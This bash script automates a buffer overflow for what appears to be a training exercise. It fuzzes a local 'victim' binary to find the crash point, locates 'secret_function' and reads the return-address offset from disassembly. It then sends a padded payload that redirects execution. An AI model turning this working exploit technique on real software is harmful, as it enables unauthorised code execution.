#!/bin/bash
#
# Automated buffer overflow exploit for the blind-overflow exercise.
# Steps: fuzz to find crash point → find target address → build payload.

# run_with_timeout CMD TIMEOUT_SECS
# Runs CMD in background, kills it if it takes longer than TIMEOUT_SECS.
# Returns the command's exit code, or 124 on timeout.
run_with_timeout() {
    local cmd="$1"
    local secs="${2:-2}"
    eval "$cmd" &
    local pid=$!
    ( sleep "$secs" && kill -9 "$pid" 2>/dev/null ) &
    local watchdog=$!
    wait "$pid" 2>/dev/null
    local rc=$?
    kill "$watchdog" 2>/dev/null
    wait "$watchdog" 2>/dev/null
    # If killed by our watchdog (SIGKILL=137), treat as timeout
    [[ $rc -eq 137 ]] && return 124
    return $rc
}

CRASH_POINT=1
echo "=== Phase 1: Fuzzing for crash point ==="

while true; do
    echo -n "Trying $CRASH_POINT bytes... "
    INPUT=$(python3 -c "print('A' * $CRASH_POINT)")
    run_with_timeout "echo '$INPUT' | ./victim 2>/dev/null >/dev/null" 2
    EXIT_CODE=$?

    if [[ $EXIT_CODE -ne 0 ]]; then
        echo "CRASH! (exit code $EXIT_CODE)"
        echo "Crash point: $CRASH_POINT bytes"
        break
    else
        echo "ok"
    fi

    ((CRASH_POINT++))

    if [[ $CRASH_POINT -gt 200 ]]; then
        echo "ERROR: No crash found within 200 bytes. Is the binary compiled correctly?"
        exit 1
    fi
done

echo ""
echo "=== Phase 2: Locating secret_function ==="

ADDR=0x$(nm ./victim | grep secret_function | awk '{print $1}')
echo "secret_function is at: $ADDR"

echo ""
echo "=== Phase 3: Confirming offset via disassembly ==="

DISASM=$(objdump -d ./victim | grep -A 30 "<_check_input>:")
ARCH=$(file ./victim | grep -o 'arm64\|x86_64')

if [[ "$ARCH" == "arm64" ]]; then
    STP_OFFSET=$(echo "$DISASM" | grep "stp.*x29, x30" | head -1 | awk '{print $NF}' | tr -d '[]#')
    BUF_OFFSET=$(echo "$DISASM" | grep "add.*x0, sp" | head -1 | awk '{print $NF}' | tr -d '#')
    PADDING=$((STP_OFFSET + 8 - BUF_OFFSET))
    echo "ARM64: LR saved at sp+$((STP_OFFSET+8)), buffer at sp+$BUF_OFFSET"
else
    BUF_NEG=$(echo "$DISASM" | grep "leaq.*(%rbp).*%rdi" | head -1 | sed 's/.*leaq.*-\([0-9]*\)(%rbp).*/\1/')
    PADDING=$((BUF_NEG + 8))
    echo "x86_64: buffer at rbp-$BUF_NEG, return address at rbp+8"
fi

echo "Padding to return address: $PADDING bytes (fuzz confirmed: $CRASH_POINT)"

echo ""
echo "=== Phase 4: Sending exploit payload ==="

python3 -c "
import struct, sys
padding = b'A' * $PADDING
payload = padding + struct.pack('<Q', $ADDR)
sys.stdout.buffer.write(payload)
" > /tmp/exploit_payload

run_with_timeout "./victim < /tmp/exploit_payload" 3
EXIT_CODE=$?
rm -f /tmp/exploit_payload

echo ""
if [[ $EXIT_CODE -eq 124 ]]; then
    echo "(Process timed out — the exploit caused a hang instead of a clean redirect)"
elif [[ $EXIT_CODE -ne 0 ]]; then
    echo "(Process exited with code $EXIT_CODE)"
fi
